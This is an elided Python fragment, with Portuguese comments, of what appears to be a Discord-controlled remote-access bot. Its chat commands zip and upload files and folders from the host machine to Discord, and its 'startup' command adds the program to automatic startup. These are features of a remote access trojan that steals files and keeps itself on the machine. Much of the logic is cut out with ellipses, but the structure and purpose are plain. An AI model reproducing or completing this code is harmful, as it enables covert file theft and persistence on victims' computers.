...
async def Folderdownload(message, folder_path):
    # Nome do arquivo zip
    zip_filename = f"{os.path.basename(folder_path)}.zip"

    # Cria o arquivo zip e adiciona os arquivos da pasta
    ...
    # Apaga o arquivo zip depois de enviado
...
async def on_message(message):
    ...
    if message.content.startswith("download"):
        ...
        try:
            ...
            embed = discord.Embed(title="Erro", description="```Arquivo não encontrado```", color=0xfafafa)
            await message.reply(embed=embed)
    
    if message.content.startswith("Folderdownload"):
        folder_name = message.content[14:]  # Obtém o nome da pasta
        folder_path = os.path.join(os.getcwd(), folder_name)  # Obtém o caminho completo para a pasta
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            await Folderdownload(message, folder_path)
        else:
            embed = discord.Embed(title="Erro", description="```Pasta não encontrada```", color=0xfafafa)
            await message.reply(embed=embed)
    ...
    if message.content.startswith("startup"):
        ...
        if not name:
            embed = discord.Embed(title="Erro", description="```Nenhum nome fornecido```", color=0xfafafa)
            await message.reply(embed=embed)
        else:
            ...
            embed = discord.Embed(title="Início Automático", description=f"```Adicionado ao início automático como {name}```", color=0xfafafa)
            await message.reply(embed=embed)
